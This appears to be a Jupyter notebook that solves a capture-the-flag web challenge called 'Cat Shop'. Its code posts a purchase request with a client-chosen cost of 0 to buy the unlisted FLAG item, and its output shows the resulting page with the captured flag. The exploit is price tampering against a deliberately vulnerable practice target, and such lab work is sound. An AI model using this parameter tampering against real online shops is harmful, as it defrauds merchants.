{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "da4c4063-6f7a-4ff0-8ef3-58a680d1720d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "c781c2b5-3200-4031-9df7-f275de4f5c3b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html>\\n<html lang=\"en\">\\n\\n<head>\\n    <meta charset=\"UTF-8\">\\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\\n    <title>Cat Shop</title>\\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css\">\\n</head>\\n\\n<body>\\n    <section class=\"hero is-link\">\\n        <div class=\"hero-head\">\\n            <nav class=\"navbar\">\\n                <div class=\"container\">\\n                    <div id=\"navbarMenuHeroA\" class=\"navbar-menu\">\\n                        <div class=\"navbar-end\">\\n                            <a href=\"/\" class=\"navbar-item is-active\">\\n                                Home\\n                            </a>\\n                            <a class=\"navbar-item\">\\n                                💰 You have $65536 now.\\n                            </a>\\n                        </div>\\n                    </div>\\n                </div>\\n            </nav>\\n        </div>\\n\\n        <div class=\"hero-body\">\\n            <p class=\"title\">\\n                Cat shop\\n            </p>\\n            <p class=\"subtitle\">\\n                🐱 🐱 🐱\\n            </p>\\n        </div>\\n    </section>\\n\\n    <section class=\"section\">\\n        <div class=\"container\">\\n            <div class=\"columns\">\\n                \\n                <div class=\"column\">\\n                    <div class=\"box\">\\n                        <h1 class=\"title is-5\">White Cat</h1>\\n                        <p>$1024</p>\\n                        <hr>\\n                        \\n                        <a href=\"/item/5427\" class=\"button is-link is-light is-fullwidth\">Buy it!</a>\\n                        \\n                    </div>\\n                </div>\\n                \\n                <div class=\"column\">\\n                    <div class=\"box\">\\n                        <h1 class=\"title is-5\">Orange Cat</h1>\\n                        <p>$1024</p>\\n                        <hr>\\n                        \\n                        <a href=\"/item/5428\" class=\"button is-link is-light is-fullwidth\">Buy it!</a>\\n                        \\n                    </div>\\n                </div>\\n                \\n                <div class=\"column\">\\n                    <div class=\"box\">\\n                        <h1 class=\"title is-5\">Ranibow Cat</h1>\\n                        <p>$4096</p>\\n                        <hr>\\n                        \\n                        <a href=\"/item/5429\" class=\"button is-link is-light is-fullwidth\">Buy it!</a>\\n                        \\n                    </div>\\n                </div>\\n                \\n                <div class=\"column\">\\n                    <div class=\"box\">\\n                        <h1 class=\"title is-5\">FLAG</h1>\\n                        <p>$2147483648</p>\\n                        <hr>\\n                        \\n                        <a class=\"button is-light is-fullwidth\" title=\"No longer be sold\" disabled>🥲</a>\\n                        \\n                    </div>\\n                </div>\\n                \\n                <div class=\"column\">\\n                    <div class=\"box\">\\n                        <h1 class=\"title is-5\">Evil Cat</h1>\\n                        <p>$65536</p>\\n                        <hr>\\n                        \\n                        <a href=\"/item/5431\" class=\"button is-link is-light is-fullwidth\">Buy it!</a>\\n                        \\n                    </div>\\n                </div>\\n                \\n                <div class=\"column\">\\n                    <div class=\"box\">\\n                        <h1 class=\"title is-5\">Null Cat</h1>\\n                        <p>$0</p>\\n                        <hr>\\n                        \\n                        <a href=\"/item/5432\" class=\"button is-link is-light is-fullwidth\">Buy it!</a>\\n                        \\n                    </div>\\n                </div>\\n                \\n            </div>\\n            <hr>\\n            <h1 class=\"title\">Cat list</h1>\\n            <ol>\\n                \\n                <li>\\n                    You got a(n) <b>FLAG</b> 🐱\\n                    <code>FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}</code>\\n                </li>\\n                \\n            </ol>\\n        </div>\\n    </section>\\n\\n</body>\\n\\n</html>'"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s = requests.Session()\n",
    "r = s.get(\"http://splitline.tw:8100\")\n",
    "r = s.post(\"http://splitline.tw:8100/buy\", data={\"item_id\": 5430, \"cost\": 0})\n",
    "r = s.get(\"http://splitline.tw:8100\")\n",
    "r.text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
